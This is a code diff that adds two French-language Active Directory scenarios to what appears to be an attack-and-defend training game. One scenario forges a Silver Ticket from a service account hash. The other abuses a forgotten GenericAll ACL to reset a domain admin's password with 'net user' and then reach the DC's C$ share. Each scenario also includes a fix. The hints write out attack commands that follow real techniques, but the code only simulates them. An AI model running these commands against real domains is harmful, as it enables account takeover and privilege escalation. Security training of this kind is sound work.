@@ -4575,6 +4575,159 @@ const SCENARIOS = [
     log.push({t:"[+] Commande exécutée sur fileserver02 sans jamais connaître le mot de passe.", cls:'ok'});
     return {log, success:true};
   }
+},
+
+/* ===================== 58. Silver Ticket (Active Directory) ===================== */
+{
+  id:'ad-silver-ticket-forgery',
+  title:'Un hash de compte de service permet de forger un Silver Ticket sans jamais contacter le contrôleur de domaine',
+  category:'Active Directory (Silver Ticket)',
+  attack:{
+    who:'Vous incarnez bob, qui dispose déjà du hash NTLM du compte de service `svc-web` (obtenu par un autre moyen, hors périmètre de ce scénario).',
+    desc:"Connaissant seulement le SID du domaine et le hash NTLM du compte de service `svc-web`, vous pouvez forger localement un ticket de service (Silver Ticket) valide pour un SPN précis — sans jamais obtenir de TGT ni contacter le contrôleur de domaine. Contrairement au Kerberoasting, aucune requête ne transite par le DC : rien n'y est journalisé.",
+    hints:[
+      "`whoami /user` confirme le SID du domaine, `S-1-5-21-1234567890-234567890-345678901` — nécessaire pour forger un ticket dont la signature sera acceptée par le service ciblé.",
+      "`silver-forge --sid S-1-5-21-1234567890-234567890-345678901 --service HTTP/websrv01.lab.local --hash 8846f7eaee8fb117ad06bdd830b7586c --user Administrateur` forge localement un ticket de service valide pour ce SPN précis, signé avec le hash du compte de service — sans jamais passer par le contrôleur de domaine.",
+      "`curl --negotiate -u : http://websrv01.lab.local/admin` (le ticket forgé étant injecté dans le cache Kerberos local) donne un accès direct au panneau d'administration du service HTTP, en usurpant l'identité `Administrateur` sans qu'aucune authentification n'ait jamais transité par le DC."
+    ]
+  },
+  defense:{
+    who:'Vous incarnez désormais l\'administrateur du domaine chargé de corriger la faille.',
+    desc:"La faille ne se corrige pas côté contrôleur de domaine (qui n'est jamais sollicité par un Silver Ticket) : seule la rotation du mot de passe du compte de service invalide le hash utilisé pour forger le ticket, en changeant la clé de chiffrement qu'il utilisait.",
+    hints:[
+      "Éditez `/etc/ad/users/svc-web.json` avec `nano` et passez `passwordRotatedSinceCompromise` à `true` (le hash compromis ne correspond alors plus au mot de passe actuel du compte).",
+      "`verify` confirme que le mot de passe du compte de service a été changé depuis la compromission du hash."
+    ]
+  },
+  makeVfs(){
+    return {
+      '/':{type:'dir',perm:'755',owner:'root',children:['home','etc']},
+      '/home':{type:'dir',perm:'755',owner:'root',children:['bob']},
+      '/home/bob':{type:'dir',perm:'755',owner:'bob',children:[]},
+      '/etc':{type:'dir',perm:'755',owner:'root',children:['ad']},
+      '/etc/ad':{type:'dir',perm:'755',owner:'root',children:['users']},
+      '/etc/ad/users':{type:'dir',perm:'755',owner:'root',children:['svc-web.json']},
+      '/etc/ad/users/svc-web.json':{type:'file',perm:'644',owner:'root',size:110,
+        content:"{\n  \"sAMAccountName\": \"svc-web\",\n  \"servicePrincipalName\": \"HTTP/websrv01.lab.local\",\n  \"passwordRotatedSinceCompromise\": false\n}\n"}
+    };
+  },
+  startUserAttack:'bob', startCwdAttack:'/home/bob',
+  exploitRules:[
+    { pattern:/^whoami\s+\/user$/, run(state, print){
+        print('lab\\bob  S-1-5-21-1234567890-234567890-345678901-1104', 'out');
+      }
+    },
+    { pattern:/^silver-forge\s+--sid\s+S-1-5-21-1234567890-234567890-345678901\s+--service\s+HTTP\/websrv01\.lab\.local\s+--hash\s+8846f7eaee8fb117ad06bdd830b7586c\s+--user\s+Administrateur$/, run(state, print){
+        state.flags = state.flags || {};
+        state.flags.ticketForged = true;
+        print('[+] Silver Ticket forgé pour HTTP/websrv01.lab.local, usurpant Administrateur — aucune requête envoyée au DC.', 'ok');
+      }
+    },
+    { pattern:/^curl\s+--negotiate\s+-u\s+:\s+http:\/\/websrv01\.lab\.local\/admin$/, run(state, print){
+        if(!state.flags || !state.flags.ticketForged){ print('curl: (6) Impossible de négocier — aucun ticket Kerberos en cache.', 'err'); return; }
+        const rotated = /"passwordRotatedSinceCompromise":\s*true/.test(state.vfs['/etc/ad/users/svc-web.json'].content);
+        if(rotated){ print('401 Unauthorized: signature du ticket invalide (clé du service changée depuis).', 'err'); return; }
+        state.flags.adminAccess = true;
+        print('{"panel":"admin","host":"websrv01","user":"Administrateur"}', 'ok');
+        print("[+] Accès administrateur obtenu sur websrv01 via un Silver Ticket, sans jamais solliciter le contrôleur de domaine.", 'ok');
+        print("FLAG{ad_silver_ticket_svc_web_forged}", 'flagline');
+      }
+    }
+  ],
+  attackCheck(state){ return state.flags && state.flags.adminAccess === true; },
+  defenseCheck(state){ return /"passwordRotatedSinceCompromise":\s*true/.test(state.vfs['/etc/ad/users/svc-web.json'].content); },
+  replay(state){
+    const log=[];
+    const rotated = /"passwordRotatedSinceCompromise":\s*true/.test(state.vfs['/etc/ad/users/svc-web.json'].content);
+    log.push({t:'$ curl --negotiate -u : http://websrv01.lab.local/admin', cls:'prompt-line'});
+    if(rotated){
+      log.push({t:'401 Unauthorized: signature du ticket invalide (clé du service changée depuis).', cls:'err'});
+      log.push({t:"[-] Le mot de passe du compte de service a été changé depuis : la faille est corrigée.", cls:'err'});
+      return {log, success:false};
+    }
+    log.push({t:'{"panel":"admin","host":"websrv01","user":"Administrateur"}', cls:'ok'});
+    log.push({t:"[+] Accès administrateur obtenu via un Silver Ticket forgé, sans jamais solliciter le DC.", cls:'ok'});
+    return {log, success:true};
+  }
+},
+
+/* ===================== 59. Abus d'ACL GenericAll (Active Directory) ===================== */
+{
+  id:'ad-acl-genericall-privesc',
+  title:'Un droit GenericAll oublié sur un compte administrateur du domaine permet d\'en réinitialiser le mot de passe',
+  category:'Active Directory (abus d\'ACL, GenericAll)',
+  attack:{
+    who:'Vous incarnez bob, membre du groupe support de premier niveau `Support-L1`, sans aucun privilège d\'administration du domaine.',
+    desc:"Une délégation ancienne, jamais révoquée, accorde au groupe `Support-L1` le droit `GenericAll` sur le compte `j.martin` — qui se trouve être administrateur du domaine. `GenericAll` inclut le droit de réinitialiser directement son mot de passe : aucun outil d'exploitation sophistiqué n'est nécessaire, la faille est l'ACL elle-même, pas une technique d'attaque.",
+    hints:[
+      "`dsacls \"CN=j.martin,CN=Users,DC=lab,DC=local\"` liste les autorisations effectives sur ce compte : `Support-L1` y apparaît avec le droit `GENERIC_ALL`, bien au-delà de ce qu'un rôle de support devrait avoir.",
+      "`GenericAll` inclut implicitement le droit de réinitialiser le mot de passe du compte ciblé, exactement comme s'il s'agissait d'une action d'administration légitime — `net user j.martin NewP@ssw0rd123! /domain` suffit.",
+      "`net use \\\\dc01\\C$ /user:j.martin NewP@ssw0rd123!` confirme l'accès administrateur du domaine obtenu via ce nouveau mot de passe."
+    ]
+  },
+  defense:{
+    who:'Vous incarnez désormais l\'administrateur du domaine chargé de corriger la faille.',
+    desc:"Révoquez cette ACE `GenericAll` héritée d'une délégation obsolète, sans casser les droits de support légitimes dont `Support-L1` a réellement besoin sur les comptes standards.",
+    hints:[
+      "Éditez `/etc/ad/acl/j-martin.json` avec `nano` et passez `supportL1GenericAll` à `false`.",
+      "`verify` confirme que le groupe Support-L1 ne dispose plus du droit GenericAll sur ce compte."
+    ]
+  },
+  makeVfs(){
+    return {
+      '/':{type:'dir',perm:'755',owner:'root',children:['home','etc']},
+      '/home':{type:'dir',perm:'755',owner:'root',children:['bob']},
+      '/home/bob':{type:'dir',perm:'755',owner:'bob',children:[]},
+      '/etc':{type:'dir',perm:'755',owner:'root',children:['ad']},
+      '/etc/ad':{type:'dir',perm:'755',owner:'root',children:['acl']},
+      '/etc/ad/acl':{type:'dir',perm:'755',owner:'root',children:['j-martin.json']},
+      '/etc/ad/acl/j-martin.json':{type:'file',perm:'644',owner:'root',size:80,
+        content:"{\n  \"account\": \"j.martin\",\n  \"memberOf\": \"Admins du domaine\",\n  \"supportL1GenericAll\": true\n}\n"}
+    };
+  },
+  startUserAttack:'bob', startCwdAttack:'/home/bob',
+  exploitRules:[
+    { pattern:/^dsacls\s+"CN=j\.martin,CN=Users,DC=lab,DC=local"$/, run(state, print){
+        const has = /"supportL1GenericAll":\s*true/.test(state.vfs['/etc/ad/acl/j-martin.json'].content);
+        if(!has){ print('Allow LAB\\Domain Admins             SPECIAL ACCESS\nAllow LAB\\Support-L1                READ PROPERTY', 'out'); return; }
+        state.flags = state.flags || {};
+        state.flags.aclSeen = true;
+        print('Allow LAB\\Domain Admins             SPECIAL ACCESS\nAllow LAB\\Support-L1                GENERIC_ALL', 'out');
+        print("[i] Support-L1 dispose du droit GENERIC_ALL sur ce compte administrateur du domaine.", 'info');
+      }
+    },
+    { pattern:/^net\s+user\s+j\.martin\s+NewP@ssw0rd123!\s+\/domain$/, run(state, print){
+        const has = /"supportL1GenericAll":\s*true/.test(state.vfs['/etc/ad/acl/j-martin.json'].content);
+        if(!has){ print("net user: accès refusé — droits insuffisants sur ce compte.", 'err'); return; }
+        if(!state.flags || !state.flags.aclSeen){ print("net user: accès refusé — vérifiez d'abord vos droits effectifs sur ce compte.", 'err'); return; }
+        state.flags.passwordReset = true;
+        print("La commande s'est terminée correctement.", 'ok');
+        print("[+] Mot de passe de j.martin (administrateur du domaine) réinitialisé via GenericAll.", 'ok');
+      }
+    },
+    { pattern:/^net\s+use\s+\\\\dc01\\C\$\s+\/user:j\.martin\s+NewP@ssw0rd123!$/, run(state, print){
+        if(!state.flags || !state.flags.passwordReset){ print('net use : mot de passe incorrect ou inconnu.', 'err'); return; }
+        state.flags.persisted = true;
+        print("La commande s'est terminée correctement.", 'ok');
+        print("[+] Accès administrateur du domaine confirmé sur dc01, via l'ACL GenericAll oubliée.", 'ok');
+        print("FLAG{ad_acl_genericall_j_martin_domain_admin}", 'flagline');
+      }
+    }
+  ],
+  attackCheck(state){ return state.flags && state.flags.persisted === true; },
+  defenseCheck(state){ return !/"supportL1GenericAll":\s*true/.test(state.vfs['/etc/ad/acl/j-martin.json'].content); },
+  replay(state){
+    const log=[];
+    const has = /"supportL1GenericAll":\s*true/.test(state.vfs['/etc/ad/acl/j-martin.json'].content);
+    log.push({t:'$ net user j.martin NewP@ssw0rd123! /domain', cls:'prompt-line'});
+    if(!has){
+      log.push({t:'net user: accès refusé — droits insuffisants sur ce compte.', cls:'err'});
+      log.push({t:"[-] Le droit GenericAll de Support-L1 a été révoqué : la faille est corrigée.", cls:'err'});
+      return {log, success:false};
+    }
+    log.push({t:"[+] Mot de passe de j.martin réinitialisé via GenericAll, accès administrateur du domaine confirmé.", cls:'ok'});
+    return {log, success:true};
+  }
 }
 
 ];
